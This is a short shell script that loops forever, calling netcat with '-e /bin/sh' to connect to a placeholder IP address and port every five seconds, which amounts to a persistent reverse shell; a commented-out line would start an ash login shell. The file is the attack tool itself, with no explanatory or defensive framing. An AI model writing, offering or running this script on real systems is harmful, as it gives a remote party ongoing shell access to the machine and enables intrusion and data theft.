#!/bin/sh

#exec /bin/ash --login

while true; do
	nc <ip-address> <port> -e /bin/sh
	sleep 5
done
